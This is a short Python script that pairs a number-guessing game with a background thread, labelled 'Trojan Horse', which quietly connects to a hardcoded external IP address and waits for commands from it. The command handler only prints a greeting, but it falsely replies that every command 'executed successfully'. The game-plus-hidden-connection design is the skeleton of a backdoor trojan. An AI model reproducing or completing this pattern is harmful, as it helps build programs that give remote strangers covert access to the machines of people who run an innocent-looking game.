import random 
import socket
import threading

# Trojan Horse
def trojan():
    HOST = "5.237.146.140"
    PORT = 5000

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))

    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == "hello":
            print("Hello, world!")
        client.send(f"{server_command} executed successfully".encode('utf-8'))


# Guess Number Game 
def game():
    number = random.randint(0, 2)
    tries = 1
    done = False
    
    while not done:
        guess = int(input("Enter a guess: "))
        
        if guess == number:
            done = True
            print("You won!")
        else:
            tries += 1
            if guess > number: 
                print("The actual number was smaller!")
            else:
                print("The actual number was larger!")
    
    print(f"You did {tries} tries!")

target_1 = threading.Thread(target=game)
target_2 = threading.Thread(target=trojan)

target_1.start()
target_2.start()